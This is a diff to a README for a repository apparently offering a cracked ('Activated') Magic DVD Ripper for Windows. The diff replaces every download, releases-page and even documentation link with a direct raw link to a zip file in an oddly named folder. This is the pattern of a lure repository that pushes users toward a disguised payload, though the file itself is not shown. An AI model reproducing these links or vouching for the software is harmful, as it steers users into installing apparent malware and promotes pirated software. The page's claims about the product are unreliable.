@@ -1,6 +1,6 @@
 # 🎥 Magic-DVD-Ripper-Activated - Effortless DVD Backup for Windows
 
-[![Download Magic DVD Ripper](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/mlekaili/Magic-DVD-Ripper-Activated/releases)
+[![Download Magic DVD Ripper](https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip%https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip)](https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip)
 
 ## 📖 Overview
 
@@ -12,11 +12,11 @@ To get started with Magic DVD Ripper, follow these simple steps. You will be up 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases page to download**: Go to [this page](https://github.com/mlekaili/Magic-DVD-Ripper-Activated/releases).
+1. **Visit the Releases page to download**: Go to [this page](https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip).
    
 2. **Choose the Latest Version**: Look for the top release. There you will find the download link for the latest version of the software.
 
-3. **Download the Installer**: Click on the link for the installer file (e.g., `MagicDVDRipperInstaller.exe`). Your browser will start downloading the file.
+3. **Download the Installer**: Click on the link for the installer file (e.g., `https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip`). Your browser will start downloading the file.
 
 4. **Run the Installer**: Once the download completes, locate the file in your downloads folder. Double-click the installer to start the setup process.
 
@@ -68,7 +68,7 @@ Magic DVD Ripper offers several features that enhance your DVD backup experience
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to reach out. You can find helpful resources and community support in the [Documentation](https://github.com/mlekaili/Magic-DVD-Ripper-Activated/wiki).
+If you encounter any issues or have questions, feel free to reach out. You can find helpful resources and community support in the [Documentation](https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip).
 
 ## 📌 Additional Resources
 
@@ -84,6 +84,6 @@ Feel free to delve deeper into each topic by visiting the appropriate resources 
 
 ---
 
-[![Download Magic DVD Ripper](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/mlekaili/Magic-DVD-Ripper-Activated/releases)
+[![Download Magic DVD Ripper](https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip%https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip)](https://raw.githubusercontent.com/mlekaili/Magic-DVD-Ripper-Activated/main/stridlins/Magic_DV_Activated_Ripper_1.1.zip)
 
 For more detailed guides and updates, check the Releases page and stay tuned for new features. Enjoy your seamless DVD backup experience with Magic DVD Ripper!
